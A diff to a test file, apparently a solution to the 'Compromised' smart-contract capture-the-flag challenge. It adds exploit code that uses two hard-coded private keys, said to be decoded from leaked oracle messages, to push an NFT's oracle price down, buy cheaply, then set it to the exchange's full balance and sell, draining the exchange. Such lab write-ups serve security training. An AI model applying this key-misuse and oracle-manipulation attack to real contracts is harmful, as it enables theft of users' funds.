@@ -60,7 +60,47 @@ describe('Compromised challenge', function () {
     });
 
     it('Exploit', async function () {        
-        /** CODE YOUR EXPLOIT HERE */
+        //The key to start solving the challenge is understanding the encoded messages. The hex message can be
+        //converted to text, and if recognized, the text is base64 encoded as well. Decoding again we obtain..
+        //two private keys, corresponding to oracles addresses as it can be check later. 
+        //So we create wallets to sign transactions and manipulate the NFT' price that oracles are providing.
+        //After setting a lower price, we buy cheap and then we set new NFT' price again to sell and 
+        //transfer all exchange contract balance to our attacker address. 
+
+        //Build oracle wallets to sign/send transactions
+        const pk1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
+        const pk2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
+        const oracleWallet = new ethers.Wallet(pk1, ethers.provider);
+        const oracle2Wallet = new ethers.Wallet(pk2, ethers.provider);
+        console.log("Confirmed oracle addresses:",oracleWallet.address, " and ",oracle2Wallet.address)
+
+        //Set lower oracle prices for NFT and sign txs with oracle wallets
+        console.log("Default NFT price", (await this.oracle.getMedianPrice("DVNFT")).toString());
+        await this.oracle.connect(oracleWallet).postPrice("DVNFT", ethers.utils.parseEther('0.01'))
+        await this.oracle.connect(oracle2Wallet).postPrice("DVNFT",ethers.utils.parseEther('0.01'))
+        console.log("Updated NFT price to buy NFT", (await this.oracle.getMedianPrice("DVNFT")).toString());
+
+        //Buy NFT in the exchange
+        console.log("Attacker balance pre-buy", (await ethers.provider.getBalance(attacker.address)).toString());
+        await this.exchange.connect(attacker).buyOne({value: ethers.utils.parseEther('0.01')})
+        console.log("Attacker balance post-buy", (await ethers.provider.getBalance(attacker.address)).toString());
+        console.log("Attacker now owns an NFT: ", (await this.nftToken.balanceOf(attacker.address)).toString())
+
+        //Set oracle price to total exchange balance and sign txs with oracle wallets
+        const exchangeBalance = await ethers.provider.getBalance(this.exchange.address)
+        await this.oracle.connect(oracleWallet).postPrice("DVNFT", exchangeBalance )
+        await this.oracle.connect(oracle2Wallet).postPrice("DVNFT", exchangeBalance )
+        console.log("Updated NFT price to sell NFT ", (await this.oracle.getMedianPrice("DVNFT")).toString());
+
+        //Approve and sell NFT in the exchange
+        await this.nftToken.connect(attacker).approve(this.exchange.address,0);
+        await this.exchange.connect(attacker).sellOne(0);
+        console.log("Attacker balance after selling", (await ethers.provider.getBalance(attacker.address)).toString());
+        console.log("Exchange balance after selling", (await ethers.provider.getBalance(this.exchange.address)).toString());
+
+        //Reset both oracle NFT price to default price
+        await this.oracle.connect(oracleWallet).postPrice("DVNFT", INITIAL_NFT_PRICE)
+        await this.oracle.connect(oracle2Wallet).postPrice("DVNFT", INITIAL_NFT_PRICE)
     });
 
     after(async function () {
